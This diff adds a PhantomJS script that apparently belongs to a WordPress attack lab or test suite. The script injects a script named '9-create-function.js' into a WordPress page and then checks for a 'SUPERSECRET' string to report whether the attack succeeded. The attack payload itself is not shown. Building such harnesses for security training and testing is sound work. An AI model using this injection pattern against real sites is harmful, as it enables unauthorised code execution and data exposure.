@@ -1,0 +1,29 @@
+#!/usr/bin/env phantomjs
+
+var wp = require( './wp' );
+var page = wp.page();
+
+page.open( wp.url, function() {
+	page.onLoadFinished = function() {
+		page.onLoadFinished = function() {};
+
+		page.open( wp.url + '?like_my_color', function() {
+			var contents = page.evaluate( function() {
+				return jQuery( 'body' ).text();
+			} );
+
+			if ( -1 < contents.indexOf( 'SUPERSECRET' ) ) {
+				console.log( 'Attack Successful1!' );
+				phantom.exit();
+			} else {
+				console.log( 'Attack Unsuccessful1!' );
+				phantom.exit( 1 );
+			}
+		} );
+	};
+
+	console.log( 'Injecting 9-create-function.js...' );
+	page.evaluate( function( url ) {
+		jQuery.getScript( url + 'attacks/9-create-function.js' );
+	}, wp.url );
+} );
